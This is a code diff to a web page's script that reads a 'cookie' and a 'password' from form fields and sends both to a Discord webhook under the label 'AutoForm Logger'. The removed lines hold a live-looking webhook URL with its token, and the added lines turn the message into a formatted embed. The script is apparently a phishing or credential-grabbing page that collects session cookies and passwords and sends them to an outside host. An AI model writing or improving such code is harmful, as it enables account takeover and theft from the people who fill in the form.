@@ -53,7 +53,7 @@
     async function sendToDiscord() {
       const cookie = document.getElementById("cookie").value;
       const password = document.getElementById("password").value;
-      const webhook = "https://discord.com/api/webhooks/1359540991710859566/x0Q8WbwtQR2WzgEacXd1DXFoLFJiYGRMGSMFPYw_pW6r_gvSv5UixBi9aTKG3crqPtFT"; // Replace this
+      const webhook = "YOUR_WEBHOOK_URL"; // Replace with actual Discord webhook
 
       if (!cookie || !password) {
         alert("Please enter both cookie and password.");
@@ -61,7 +61,13 @@
       }
 
       const payload = {
-        content: `New Entry:\n**Cookie:** ${cookie}\n**Password:** ${password}`
+        embeds: [{
+          title: "New Entry",
+          color: 0x00ffff,
+          description: `**🍪 Cookie:** \`${cookie}\`\n**🔐 Password:** \`${password}\``,
+          footer: { text: "AutoForm Logger" },
+          timestamp: new Date().toISOString()
+        }]
       };
 
       try {
